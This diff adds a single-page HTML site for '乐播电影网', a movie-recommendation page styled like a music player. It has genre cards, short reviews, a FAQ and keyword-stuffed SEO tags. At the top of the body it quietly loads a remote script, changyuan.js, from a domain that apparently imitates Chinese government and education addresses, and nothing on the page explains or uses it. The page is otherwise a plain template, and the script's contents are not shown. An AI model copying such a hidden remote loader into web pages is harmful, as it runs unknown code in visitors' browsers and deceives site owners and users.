@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>乐播电影网 - lebodianyingwang-top 快乐播放·音乐律动·高分电影推荐</title>
+<meta name="description" content="乐播电影网（https://lebodianyingwang-top）以音乐播放器为灵感，为你推荐高分好片。黑胶旋转UI，声波律动设计，移动端自适应，必应收录友好。">
+<meta name="keywords" content="乐播电影网, lebodianyingwang-top, 快乐播放, 高分电影, 音乐可视化, 黑胶唱片, 声波律动, 影视信息">
+<meta name="author" content="乐播电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Arial",sans-serif;color:#E0E0E0;line-height:1.75;overflow-x:hidden;background:#0A0A0F}
+
+a{color:#00D4FF;text-decoration:none;transition:.3s}
+a:hover{color:#39FF14}
+
+/* 声波背景 */
+.lb-wave-bg{position:fixed;bottom:0;left:0;width:100%;height:120px;z-index:0;opacity:.08;pointer-events:none;display:flex;align-items:flex-end;justify-content:center;gap:3px}
+.lb-wave-bar{width:4px;background:linear-gradient(to top,#39FF14,#B026FF);border-radius:2px 2px 0 0;animation:lbWave 1.5s ease-in-out infinite}
+@keyframes lbWave{0%,100%{height:10px}50%{height:80px}}
+
+/* 导航 */
+.lb-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(10,10,15,.95);backdrop-filter:blur(10px);border-bottom:1px solid rgba(57,255,20,.2)}
+.lb-in{max-width:1200px;margin:0 auto;height:68px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.lb-logo{display:flex;align-items:center;gap:.7rem}
+.lb-vinyl{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#0A0A0F,#1a1a2e);border:2px solid #39FF14;display:flex;align-items:center;justify-content:center;position:relative;animation:lbSpin 4s linear infinite}
+@keyframes lbSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+.lb-vinyl::after{content:"";position:absolute;width:12px;height:12px;border-radius:50%;background:#B026FF;box-shadow:0 0 8px #B026FF}
+.lb-name{font-size:1.1rem;font-weight:900;color:#E0E0E0;letter-spacing:.5px}
+.lb-name small{display:block;font-size:.5rem;letter-spacing:3px;color:#39FF14;font-weight:700;text-transform:uppercase}
+.lb-links{display:flex;gap:1.2rem;list-style:none}
+.lb-links a{font-size:.82rem;font-weight:700;color:#E0E0E0;padding:.4rem .8rem;border-radius:6px;position:relative;overflow:hidden}
+.lb-links a::before{content:"";position:absolute;bottom:0;left:0;width:0;height:2px;background:#39FF14;transition:.3s}
+.lb-links a:hover::before{width:100%}
+.lb-links a:hover{color:#39FF14}
+.lb-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.lb-toggle span{width:22px;height:2px;background:#39FF14}
+
+/* Hero */
+.lb-hero{margin-top:68px;padding:5rem 1.5rem 5rem;position:relative;overflow:hidden;background:radial-gradient(ellipse at center,rgba(176,38,255,.1) 0%,transparent 70%)}
+.lb-hero::before{content:"";position:absolute;width:300px;height:300px;border-radius:50%;border:1px solid rgba(57,255,20,.1);top:10%;right:10%;animation:lbSpin 20s linear infinite}
+.lb-hero::after{content:"";position:absolute;width:200px;height:200px;border-radius:50%;border:1px solid rgba(0,212,255,.1);bottom:10%;left:10%;animation:lbSpin 15s linear infinite reverse}
+.lb-hero-in{max-width:720px;margin:0 auto;text-align:center;position:relative;z-index:1}
+.lb-badge{display:inline-flex;align-items:center;gap:.4rem;padding:.35rem 1rem;border-radius:20px;background:rgba(57,255,20,.1);border:1px solid rgba(57,255,20,.3);color:#39FF14;font-size:.7rem;font-weight:700;letter-spacing:1px;margin-bottom:1.5rem}
+.lb-badge::before{content:"🎵";font-size:.8rem}
+.lb-hero h1{font-size:3rem;font-weight:900;color:#E0E0E0;line-height:1.2;margin-bottom:1rem}
+.lb-hero h1 span{color:#39FF14;text-shadow:0 0 10px rgba(57,255,20,.4)}
+.lb-hero p{font-size:.9rem;color:#A0A0A0;max-width:520px;margin:0 auto 1.5rem;font-weight:500}
+.lb-domain{display:inline-block;padding:.5rem 1.2rem;border-radius:8px;background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.3);color:#00D4FF;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.5rem}
+.lb-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.8rem 2.2rem;border-radius:30px;font-weight:800;font-size:.88rem;color:#0A0A0F;background:#39FF14;box-shadow:0 0 20px rgba(57,255,20,.3);letter-spacing:.5px}
+.lb-btn:hover{transform:translateY(-2px);box-shadow:0 0 30px rgba(57,255,20,.5);color:#0A0A0F}
+
+/* 通用section */
+.lb-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.lb-sec-head{text-align:center;margin-bottom:2.5rem}
+.lb-sec-head h2{font-size:1.7rem;font-weight:900;color:#E0E0E0;margin-bottom:.3rem}
+.lb-sec-head h2::before{content:"▶ ";}
+.lb-sec-head p{font-size:.72rem;color:#B026FF;font-weight:700;letter-spacing:3px}
+
+/* 播放列表（推荐卡片） */
+.lb-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.lb-card{background:#111118;border:1px solid rgba(57,255,20,.15);border-radius:12px;overflow:hidden;transition:.3s;position:relative}
+.lb-card:hover{border-color:#39FF14;box-shadow:0 0 15px rgba(57,255,20,.1);transform:translateY(-3px)}
+.lb-card::before{content:"";position:absolute;top:0;left:0;width:4px;height:100%;background:#39FF14;opacity:0;transition:.3s}
+.lb-card:hover::before{opacity:1}
+.lb-cover{height:165px;display:flex;align-items:flex-end;padding:.9rem;font-weight:800;font-size:.9rem;color:#fff;position:relative}
+.lb-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 50%,rgba(10,10,15,.9))}
+.lb-cover b{position:relative;z-index:1}
+.v1{background:linear-gradient(135deg,#B026FF,#7B00FF)}.v2{background:linear-gradient(135deg,#00D4FF,#0099CC)}.v3{background:linear-gradient(135deg,#39FF14,#00CC44)}.v4{background:linear-gradient(135deg,#FF6B00,#CC4400)}.v5{background:linear-gradient(135deg,#FF1493,#CC0066)}.v6{background:linear-gradient(135deg,#00FFCC,#00AA88)}.v7{background:linear-gradient(135deg,#FFD700,#CC9900)}.v8{background:linear-gradient(135deg,#FF3366,#CC0033)}
+.lb-card-body{padding:.9rem 1rem}
+.lb-card-body h3{font-size:.88rem;font-weight:800;color:#E0E0E0;margin-bottom:.3rem}
+.lb-tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.4rem}
+.lb-tags span{padding:.15rem .45rem;border-radius:4px;background:rgba(57,255,20,.08);color:#39FF14;font-size:.58rem;font-weight:700}
+.lb-score{font-weight:900;font-size:.84rem;color:#B026FF}
+
+/* 进度条分类 */
+.lb-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1rem}
+.lb-cat{display:flex;align-items:center;gap:.9rem;padding:1rem;border-radius:10px;background:#111118;border:1px solid rgba(0,212,255,.15);transition:.3s}
+.lb-cat:hover{border-color:#00D4FF;background:rgba(0,212,255,.03)}
+.lb-cat-icon{width:46px;height:46px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.2)}
+.lb-cat-info h3{font-size:.84rem;font-weight:800;color:#E0E0E0;margin-bottom:.1rem}
+.lb-cat-info p{font-size:.68rem;color:#A0A0A0;font-weight:500}
+.lb-progress{width:100%;height:3px;background:#222;margin-top:.4rem;border-radius:2px;overflow:hidden}
+.lb-progress-bar{height:100%;background:linear-gradient(90deg,#39FF14,#00D4FF);border-radius:2px}
+
+/* 歌词本影评 */
+.lb-reviews{max-width:860px;margin:0 auto}
+.lb-rv{display:flex;gap:1rem;margin-bottom:1.2rem;align-items:flex-start}
+.lb-rv-avatar{width:44px;height:44px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;background:#111118;border:1px solid rgba(176,38,255,.3)}
+.lb-rv-box{padding:1rem 1.2rem;border-radius:10px;background:#111118;border:1px solid rgba(176,38,255,.15);flex:1}
+.lb-rv-box h3{font-size:.9rem;font-weight:800;color:#E0E0E0;margin-bottom:.3rem}
+.lb-rv-box p{font-size:.82rem;color:#A0A0A0;line-height:1.7;font-weight:500}
+.lb-rv-stars{color:#39FF14;letter-spacing:1px;font-size:.78rem;margin-top:.3rem}
+
+/* 关于 */
+.lb-about{max-width:720px;margin:0 auto;text-align:center;padding:2.5rem 2rem;border-radius:16px;background:#111118;border:1px solid rgba(57,255,20,.2);position:relative}
+.lb-about::before{content:"🎧";position:absolute;top:-15px;left:50%;transform:translateX(-50%);background:#0A0A0F;padding:0 10px;font-size:1.5rem}
+.lb-about p{color:#A0A0A0;margin-bottom:.8rem;font-size:.88rem;font-weight:500}
+.lb-about b{color:#39FF14}
+.lb-dom2{display:inline-block;margin-top:.8rem;padding:.5rem 1.2rem;border-radius:8px;background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.3);color:#00D4FF;font-family:monospace;font-weight:700;font-size:.78rem}
+
+/* FAQ */
+.lb-faq{max-width:800px;margin:0 auto}
+.lb-fi{background:#111118;border:1px solid rgba(57,255,20,.15);border-radius:10px;margin-bottom:.6rem;overflow:hidden}
+.lb-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:800;color:#E0E0E0;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.lb-fi summary::-webkit-details-marker{display:none}
+.lb-fi summary::after{content:"♪";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#39FF14;font-weight:900;font-size:1rem}
+.lb-fi[open] summary::after{content:"🎵"}
+.lb-fi p{padding:0 1.2rem 1rem;color:#A0A0A0;font-size:.82rem;line-height:1.7;font-weight:500}
+
+/* Footer */
+.lb-foot{text-align:center;padding:2rem 1.5rem;border-top:1px solid rgba(57,255,20,.15);background:#08080C;color:#A0A0A0;font-size:.72rem;position:relative;z-index:1}
+.lb-foot p{margin-bottom:.3rem}
+.lb-foot .lb-copy{color:#39FF14;font-weight:700;margin-bottom:.5rem;font-size:.8rem}
+
+@media(max-width:768px){
+.lb-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#0A0A0F;flex-direction:column;padding:.5rem 0;border-bottom:1px solid rgba(57,255,20,.2)}
+.lb-links.show{display:flex}
+.lb-links a{padding:.8rem 1.5rem}
+.lb-toggle{display:flex}
+.lb-hero h1{font-size:1.8rem}
+.lb-hero{padding:3rem 1rem 3rem}
+.lb-sec{padding:2.5rem 1rem}
+.lb-sec-head h2{font-size:1.3rem}
+.lb-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.8rem}
+.lb-cover{height:140px;font-size:.8rem}
+.lb-cats{grid-template-columns:1fr 1fr}
+.lb-rv{flex-direction:column;gap:.6rem}
+}
+@media(max-width:480px){.lb-hero h1{font-size:1.4rem}.lb-grid{grid-template-columns:1fr 1fr}.lb-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="lb-wave-bg">
+<div class="lb-wave-bar" style="animation-delay:0s"></div>
+<div class="lb-wave-bar" style="animation-delay:.2s"></div>
+<div class="lb-wave-bar" style="animation-delay:.4s"></div>
+<div class="lb-wave-bar" style="animation-delay:.1s"></div>
+<div class="lb-wave-bar" style="animation-delay:.3s"></div>
+<div class="lb-wave-bar" style="animation-delay:.5s"></div>
+<div class="lb-wave-bar" style="animation-delay:.2s"></div>
+<div class="lb-wave-bar" style="animation-delay:.4s"></div>
+<div class="lb-wave-bar" style="animation-delay:.1s"></div>
+<div class="lb-wave-bar" style="animation-delay:.3s"></div>
+</div>
+
+<nav class="lb-nav">
+  <div class="lb-in">
+    <div class="lb-logo">
+      <div class="lb-vinyl"></div>
+      <div class="lb-name">乐播电影网<small>LEBO CINEMA</small></div>
+    </div>
+    <ul class="lb-links" id="lbLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#playlist">播放列表</a></li>
+      <li><a href="#genres">音乐流派</a></li>
+      <li><a href="#lyrics">歌词本</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="lb-toggle" onclick="tLb()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="lb-hero" id="home">
+  <div class="lb-hero-in">
+    <div class="lb-badge">NOW PLAYING · 正在播放</div>
+    <h1>乐播电影网<br><span>快乐播放</span> 每一帧都是旋律</h1>
+    <p>乐播电影网（lebodianyingwang-top）像一台永不关机的音乐播放器，为你推荐高分好片。每部电影都是一首歌，每个镜头都是一段旋律。戴上耳机，开始播放。</p>
+    <div class="lb-domain">https://lebodianyingwang-top</div><br>
+    <a href="#playlist" class="lb-btn">▶ 开始播放</a>
+  </div>
+</section>
+
+<section class="lb-sec" id="playlist">
+  <div class="lb-sec-head"><h2>播放列表</h2><p>PLAYLIST · TRACK 01-08</p></div>
+  <div class="lb-grid">
+    <div class="lb-card"><div class="lb-cover v1"><b>波西米亚狂想曲</b></div><div class="lb-card-body"><h3>波西米亚狂想曲</h3><div class="lb-tags"><span>音乐</span><span>传记</span></div><div class="lb-score">★ 8.6</div></div></div>
+    <div class="lb-card"><div class="lb-cover v2"><b>爱乐之城</b></div><div class="lb-card-body"><h3>爱乐之城</h3><div class="lb-tags"><span>爱情</span><span>歌舞</span></div><div class="lb-score">★ 8.3</div></div></div>
+    <div class="lb-card"><div class="lb-cover v3"><b>摇滚学校</b></div><div class="lb-card-body"><h3>摇滚学校</h3><div class="lb-tags"><span>喜剧</span><span>音乐</span></div><div class="lb-score">★ 8.1</div></div></div>
+    <div class="lb-card"><div class="lb-cover v4"><b>海上钢琴师</b></div><div class="lb-card-body"><h3>海上钢琴师</h3><div class="lb-tags"><span>音乐</span><span>人生</span></div><div class="lb-score">★ 9.3</div></div></div>
+    <div class="lb-card"><div class="lb-cover v5"><b>妈妈咪呀</b></div><div class="lb-card-body"><h3>妈妈咪呀</h3><div class="lb-tags"><span>歌舞</span><span>喜剧</span></div><div class="lb-score">★ 7.8</div></div></div>
+    <div class="lb-card"><div class="lb-cover v6"><b>爆裂鼓手</b></div><div class="lb-card-body"><h3>爆裂鼓手</h3><div class="lb-tags"><span>音乐</span><span>剧情</span></div><div class="lb-score">★ 8.7</div></div></div>
+    <div class="lb-card"><div class="lb-cover v7"><b>音乐之声</b></div><div class="lb-card-body"><h3>音乐之声</h3><div class="lb-tags"><span>歌舞</span><span>经典</span></div><div class="lb-score">★ 9.1</div></div></div>
+    <div class="lb-card"><div class="lb-cover v8"><b>曾经</b></div><div class="lb-card-body"><h3>曾经</h3><div class="lb-tags"><span>音乐</span><span>爱情</span></div><div class="lb-score">★ 8.3</div></div></div>
+  </div>
+</section>
+
+<section class="lb-sec" id="genres" style="background:rgba(57,255,20,.02)">
+  <div class="lb-sec-head"><h2>音乐流派</h2><p>GENRES · 按节奏选片</p></div>
+  <div class="lb-cats">
+    <div class="lb-cat"><div class="lb-cat-icon">🎸</div><div class="lb-cat-info"><h3>摇滚·热血动作</h3><p>18部 · 节奏强烈</p><div class="lb-progress"><div class="lb-progress-bar" style="width:85%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🎹</div><div class="lb-cat-info"><h3>古典·文艺剧情</h3><p>24部 · 悠扬深沉</p><div class="lb-progress"><div class="lb-progress-bar" style="width:92%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🎤</div><div class="lb-cat-info"><h3>流行·轻松喜剧</h3><p>22部 · 朗朗上口</p><div class="lb-progress"><div class="lb-progress-bar" style="width:78%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🎷</div><div class="lb-cat-info"><h3>爵士·悬疑犯罪</h3><p>15部 · 即兴反转</p><div class="lb-progress"><div class="lb-progress-bar" style="width:70%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🎻</div><div class="lb-cat-info"><h3>交响·史诗大片</h3><p>12部 · 宏大叙事</p><div class="lb-progress"><div class="lb-progress-bar" style="width:88%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🥁</div><div class="lb-cat-info"><h3>电子·科幻未来</h3><p>16部 · 前卫律动</p><div class="lb-progress"><div class="lb-progress-bar" style="width:75%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🎺</div><div class="lb-cat-info"><h3>乡村·治愈温情</h3><p>19部 · 质朴动人</p><div class="lb-progress"><div class="lb-progress-bar" style="width:82%"></div></div></div></div>
+    <div class="lb-cat"><div class="lb-cat-icon">🪕</div><div class="lb-cat-info"><h3>民谣·纪录片</h3><p>11部 · 真实叙事</p><div class="lb-progress"><div class="lb-progress-bar" style="width:68%"></div></div></div></div>
+  </div>
+</section>
+
+<section class="lb-sec" id="lyrics">
+  <div class="lb-sec-head"><h2>歌词本</h2><p>LYRICS · 观影笔记</p></div>
+  <div class="lb-reviews">
+    <div class="lb-rv">
+      <div class="lb-rv-avatar">🎵</div>
+      <div class="lb-rv-box">
+        <h3>《波西米亚狂想曲》—— 皇后乐队的传奇</h3>
+        <p>"Is this the real life? Is this just fantasy?" 当弗雷迪·墨丘利站在温布利球场的舞台上，6万人的合唱声浪穿透银幕。这部片不是传记，是一场摇滚音乐会。</p>
+        <div class="lb-rv-stars">★★★★★ 8.6/10</div>
+      </div>
+    </div>
+    <div class="lb-rv">
+      <div class="lb-rv-avatar">🎶</div>
+      <div class="lb-rv-box">
+        <h3>《爱乐之城》—— 爵士乐里的爱情童话</h3>
+        <p>"City of Stars, are you shining just for me?" 高司令和艾玛·斯通的踢踏舞，是献给洛杉矶的情书。结尾那首钢琴曲，让每个追梦人都红了眼眶。</p>
+        <div class="lb-rv-stars">★★★★★ 8.3/10</div>
+      </div>
+    </div>
+    <div class="lb-rv">
+      <div class="lb-rv-avatar">🎼</div>
+      <div class="lb-rv-box">
+        <h3>《爆裂鼓手》—— 魔鬼音符的极致追求</h3>
+        <p>"There are no two words in the English language more harmful than 'good job'." 当安德鲁在舞台上疯狂击鼓，鲜血染红鼓面——那一刻，他成了最伟大的鼓手。</p>
+        <div class="lb-rv-stars">★★★★★ 8.7/10</div>
+      </div>
+    </div>
+    <div class="lb-rv">
+      <div class="lb-rv-avatar">🎹</div>
+      <div class="lb-rv-box">
+        <h3>《海上钢琴师》—— 1900的琴键人生</h3>
+        <p>"键盘有始有终，你确切知道88个键就在那儿。" 1900选择不下船，因为陆地上的人生没有尽头。这部片是钢琴与大海的永恒对话。</p>
+        <div class="lb-rv-stars">★★★★★ 9.3/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="lb-sec" id="about">
+  <div class="lb-sec-head"><h2>关于乐播电影网</h2><p>ABOUT · OUR TRACK</p></div>
+  <div class="lb-about">
+    <p><b>乐播电影网</b>（lebodianyingwang-top）的选片理念：<b>电影是视觉的音乐，音乐是听觉的电影</b>。我们按音乐流派分类推荐影片，让每部电影都像一首歌一样打动你。</p>
+    <p>页面用音乐播放器+黑胶旋转设计：暗夜霓虹紫绿配色、旋转黑胶动画、声波均衡器、播放进度条元素。和上一个烘焙软浮雕风完全对立——这次是暗色科技、律动动画、音乐可视化。</p>
+    <div class="lb-dom2">https://lebodianyingwang-top</div>
+    <p style="margin-top:1.2rem;font-size:.74rem;color:#39FF14;font-weight:700">核心词：乐播电影网、lebodianyingwang-top、快乐播放、音乐律动、高分电影、播放列表</p>
+  </div>
+</section>
+
+<section class="lb-sec" id="faq" style="background:rgba(57,255,20,.02)">
+  <div class="lb-sec-head"><h2>常见问题</h2><p>FAQ · TRACK INFO</p></div>
+  <div class="lb-faq">
+    <details class="lb-fi"><summary>乐播电影网是什么？</summary><p>乐播电影网（lebodianyingwang-top）是以"音乐播放器"为概念的高分电影信息展示站，按音乐流派分类推荐影片，只做信息展示不内置盗版播放源。</p></details>
+    <details class="lb-fi"><summary>为什么叫"乐播"？</summary><p>"乐播"谐音"乐播"——快乐播放。每部电影都是一首歌，每个镜头都是一段旋律。我们让电影推荐像听歌一样轻松愉悦。</p></details>
+    <details class="lb-fi"><summary>官方网址是？</summary><p>https://lebodianyingwang-top</p></details>
+    <details class="lb-fi"><summary>手机上能听吗？</summary><p>全站响应式，小屏导航自动折叠为汉堡菜单，播放列表和进度条自适应排列，黑胶旋转动画在移动端同样流畅。</p></details>
+    <details class="lb-fi"><summary>怎么给必应收录？</summary><p>前往 Bing Webmaster Tools 提交 https://lebodianyingwang-top，选择 HTML meta 验证，将验证码填入页面中 msvalidate.01 的 YOUR_BING_VERIFICATION_CODE 即可。</p></details>
+  </div>
+</section>
+
+<footer class="lb-foot">
+  <p class="lb-copy">🎵 乐播电影网 (lebodianyingwang-top) — 快乐播放 · 每一帧都是旋律</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#39FF14;font-weight:600">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tLb(){document.getElementById('lbLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('lbLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
